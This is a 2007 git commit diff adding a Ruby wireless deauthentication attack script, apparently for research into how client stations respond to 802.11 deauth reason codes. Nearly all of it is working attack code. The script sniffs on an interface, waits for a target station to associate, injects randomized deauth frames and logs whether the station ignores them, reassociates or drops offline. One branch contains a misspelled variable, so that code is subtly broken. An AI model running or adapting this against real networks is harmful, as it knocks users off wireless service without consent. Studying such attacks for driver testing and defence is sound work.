737082653fcaa8c62206aa21b62b4cc34d504a74
Cory T. Cornelius <Cory.T.Cornelius@Dartmouth.edu>
2007-09-17 18:12:32 +0000

    Initial version of deauth client attack.

--- deauth_client_attack.rb
+++ deauth_client_attack.rb
@@ -1,5 +1,6 @@
 #!/usr/bin/ruby
-require "baflle-send"
+require 'baflle-send'
+require 'baflle-recv'
 
 #$blackhole1 = "00:18:F8:F4:53:1C"
 #$blackhole2 = "00:12:0E:51:AC:55"
@@ -30,6 +31,81 @@ $packets = PacketSet.new(Dot11,
                         :payload =>   $deauth)
 
 $packets.randomize = true
+
+@deauths = []
+
+$packets.each do |packet|
+  @deauths << packet
+end
+
+@station_up     = false
+@deauth         = nil
+@saw_deauth     = false
+@packet_counter = 0
+@results        = {}
+
+puts "Waiting for station to come up..."
+
+sniff "ath0" do |packet|
+  next unless (packet.addr1.to_s == $ap && packet.addr2.to_s == $station) ||
+              (packet.addr1.to_s == $station && packet.addr2.to_s == $ap)
+
+  if !@station_up
+    if packet.type == 2 && packet.subtype == 0
+      puts "Station is up!"
+      @station_up = true
+      @deauth     = nil
+    else
+      next
+    end
+  end
+  
+  if !@deauth
+    @deauth = @deauths.pop
+    break unless @deauth
+    puts "Sending deauth (reason code: #{@deauth.payload.reason}, #{@deauths.size} left)!"
+    puts "Waiting to see deauth..."
+    emit "ath0", "madwifing", @deauth
+    @saw_deauth = false
+    next
+  end
+
+  if !@saw_deauth
+    if packet == @deauth
+      puts "Saw deauth!"
+      @saw_deauth     = true
+      @packet_counter = 0
+    else
+      next
+    end
+  else
+    if packet.subtype == 0x8
+      puts "Station ignored response!"
+      @results[@deuath.payload.reason] = :ignored
+      @deauth = nil
+    elsif packet.subtype == 0x0
+      puts "Station is trying to reassociate!"
+      @results[@deauth.payload.reason] = :reassociated
+      @station_up = false
+    elsif @packet_counter >= 2000 # Tweak me...
+      puts "Station is down!"
+      @results[@deauth.payload.reason] = :down
+      @station_up = false
+    else
+      puts "Adding 1 to counter..."
+      @packet_counter += 1
+    end
+  end
+end
+
+puts "reasoncode,event"
+
+@results.each do |reason, event|
+  puts "#{reason},#{event.to_s}"
+end
+
+#BSS Id: Cisco-Li_f4:53:1c (00:18:f8:f4:53:1c)
+#Source address: DigitalE_00:0a:04 (aa:00:04:00:0a:04)
 
 # we are looking for station to come up
 
